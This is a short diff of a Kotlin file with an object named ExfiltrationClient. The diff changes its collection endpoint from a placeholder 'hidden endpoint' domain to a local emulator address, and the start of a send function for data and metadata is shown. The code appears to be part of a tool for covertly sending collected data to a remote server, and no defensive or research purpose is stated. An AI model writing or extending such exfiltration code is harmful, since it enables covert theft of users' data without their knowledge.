@@ -7,7 +7,7 @@ import java.net.HttpURLConnection
 import java.net.URL
 
 object ExfiltrationClient {
-    private const val COLLECTION_URL = "https://your-hidden-endpoint.com/collect"
+    private const val COLLECTION_URL = "http://10.0.2.2:5000/collect"
 
     fun send(data: ByteArray?, metadata: Map<String, String>) {
         if (data == null) return
